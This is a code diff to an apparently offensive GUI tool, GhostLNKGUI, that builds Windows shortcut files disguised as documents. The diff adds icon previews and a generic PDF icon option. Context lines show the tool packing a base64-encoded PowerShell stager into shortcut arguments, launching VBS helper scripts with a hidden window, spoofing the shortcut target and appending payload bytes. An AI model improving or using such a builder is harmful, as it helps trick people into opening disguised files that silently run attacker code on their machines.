@@ -9,8 +9,8 @@ from PyQt6.QtWidgets import (QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLa
                              QLineEdit, QPushButton, QTextEdit, QComboBox, QGroupBox,
                              QGridLayout, QMessageBox, QFileDialog, QCheckBox,
                              QListWidget, QSplitter, QFrame, QScrollArea, QApplication)
-from PyQt6.QtCore import Qt
-from PyQt6.QtGui import QAction, QClipboard
+from PyQt6.QtCore import Qt, QSize
+from PyQt6.QtGui import QAction, QClipboard, QIcon
 
 import pylnk3
 
@@ -29,6 +29,7 @@ CONFIG_FILE = "ghostlnk_config.json"
 class GhostLNKGUI(QMainWindow):
     ICON_DATABASE = {
         "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
+        "PDF Document - Generic": (r"C:\Windows\System32\SHELL32.dll", 1, ".pdf"),
         "Word Document": (r"C:\Windows\System32\SHELL32.dll", 1, ".doc"),
         "Excel Spreadsheet": (r"C:\Windows\System32\SHELL32.dll", 3, ".xls"),
         "Text Document": (r"C:\Windows\System32\notepad.exe", 0, ".txt"),
@@ -37,6 +38,29 @@ class GhostLNKGUI(QMainWindow):
         "JPG Image": (r"C:\Windows\System32\imageres.dll", 67, ".jpg"),
         "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165, ".zip"),
     }
+    ICON_PREVIEWS = {
+        "PDF Document": "pdf-edge.svg",
+        "PDF Document - Generic": "pdf-generic.svg",
+        "Word Document": "word.svg",
+        "Excel Spreadsheet": "excel.svg",
+        "Text Document": "text.svg",
+        "PowerShell Script": "powershell.svg",
+        "Executable": "executable.svg",
+        "JPG Image": "image.svg",
+        "ZIP Archive": "zip.svg",
+    }
+
+    @staticmethod
+    def _icon_display_name(name, icon_path):
+        normalized_path = icon_path.lower()
+        windows_prefixes = ("c:\\windows\\", "%systemroot%\\", "%windir%\\")
+        if normalized_path.startswith(windows_prefixes):
+            dependency = "built into Windows"
+        elif normalized_path.endswith("\\msedge.exe"):
+            dependency = "requires Microsoft Edge"
+        else:
+            dependency = "requires external icon resource"
+        return f"{name} ({dependency})"
 
     def __init__(self):
         super().__init__()
@@ -560,8 +584,15 @@ class GhostLNKGUI(QMainWindow):
         icon_group = QGroupBox("Icon Selection")
         icon_layout = QVBoxLayout()
         self.icon_combo = QComboBox()
-        self.icon_combo.addItems(list(self.ICON_DATABASE.keys()))
-        self.icon_combo.setCurrentText("PDF Document")
+        self.icon_combo.setIconSize(QSize(20, 20))
+        self.icon_combo.setMaxVisibleItems(len(self.ICON_DATABASE))
+        for name, (icon_path, _, _) in self.ICON_DATABASE.items():
+            preview_file = self.ICON_PREVIEWS.get(name)
+            preview_icon = QIcon()
+            if preview_file:
+                preview_icon = QIcon(str(Path(__file__).with_name("icons") / preview_file))
+            self.icon_combo.addItem(preview_icon, self._icon_display_name(name, icon_path), name)
+        self.icon_combo.setCurrentIndex(self.icon_combo.findData("PDF Document"))
         icon_layout.addWidget(self.icon_combo)
         icon_group.setLayout(icon_layout)
         layout.addWidget(icon_group)
@@ -835,7 +866,7 @@ class GhostLNKGUI(QMainWindow):
 
     def generate_desc(self):
         date = datetime.now().strftime("%d/%m/%Y")
-        icon = self.icon_combo.currentText()
+        icon = self.icon_combo.currentData()
         self.desc_input.setText(f"Type: {icon}\nSize: 1.23 MB\nDate modified: {date}")
 
     def log(self, msg):
@@ -932,7 +963,7 @@ Start-Process -FilePath "$f\\helper.vbs" -WindowStyle Hidden
         encoded = base64.b64encode(ps_stager.encode('utf-16le')).decode()
         lnk_args = f"-E {encoded}"
 
-        icon = self.icon_combo.currentText()
+        icon = self.icon_combo.currentData()
         icon_path, icon_idx, _ = self.ICON_DATABASE[icon]
         name = self.filename_input.text().strip() or "Report"
         ext_choice = self.ext_combo.currentText()
@@ -1363,7 +1394,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                         spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
                         appended_payload = getattr(self, 'appended_payload_bytes', None)
 
-            icon = self.icon_combo.currentText()
+            icon = self.icon_combo.currentData()
             icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
             name = self.filename_input.text().strip() or "Document"
             ext_choice = self.ext_combo.currentText()
